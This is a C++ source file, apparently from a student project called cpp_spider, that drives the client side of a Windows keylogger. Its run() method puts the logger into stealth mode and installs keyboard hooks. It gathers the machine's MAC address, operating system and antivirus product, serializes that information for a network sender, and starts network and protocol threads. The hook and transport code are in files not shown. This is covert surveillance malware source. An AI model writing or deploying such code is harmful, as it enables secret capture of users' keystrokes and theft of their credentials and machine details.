/*
** ClientCore.cpp for cpp_spider in /home/god/TEK3/C++/cpp_spider/sources/ClientCore.cpp
**
** Made by Maxime PILLON
** Login   <maxime.pillon@epitech.eu>
**
** Started on  Thu Oct 05 10:59:44 2017 Maxime PILLON
** Last update Thu Oct 05 10:59:44 2017 Maxime PILLON
*/

#include <boost/make_unique.hpp>
#include "Protocol/BufferSender.hpp"
#include "Protocol/ClientProtocol.hpp"
#include "KeyLogger/WindowsKeyLogger.hpp"
#include  "Thread/IThread.hpp"
#include "ClientCore.hpp"
#include "Thread/BoostThread.hpp"

spider::ClientCore::ClientCore() : _proto(new spider::ClientProtocol()),
				   _keylogger(new spider::WindowsKeyLogger())
{}

spider::ClientCore::~ClientCore()
{}

void spider::ClientCore::run()
{
  MSG msg;
  bool running;
  std::unique_ptr<spider::IThread>	thread(boost::make_unique<BoostThread>());
  std::unique_ptr<spider::IThread>	threadnet(boost::make_unique<BoostThread>());

  std::cout << "Before setting KeyLogger\n";
  running = true;
  _keylogger->stealth();
  _keylogger->initHooks();
  _keylogger->getMacAddr();
  _keylogger->getOperatingSystem();
  _keylogger->getAntiVirus();
  std::cout << "After setting KeyLogger\n";
  spider::BufferSender::BufferSenderInstance().push(spider::Serializer::getSerializer().get_string_from_ptree(spider::Serializer::getSerializer().serialize(*(_keylogger->getInfos()))));
  std::cout << "Push sender instance\n";
  if (threadnet)
  {
    std::cout << "threadNet exist" << std::endl;
    threadnet.get()->createNetThread();
  }
  if (thread)
  {
    std::cout << "thread exists" << std::endl;
    thread.get()->createThread(_proto);
  }
  std::cout << "Create thread done\n";
  while (running)
  {
    std::cout << "Running Get Message\n";
    if (!GetMessage(&msg, nullptr, 0, 0))
    {
      std::cout << "In GetMessage" << std::endl;
      running = false;
    }
    std::cout << "Begin Translation\n";
    TranslateMessage(&msg);
    DispatchMessage(&msg);
  }
}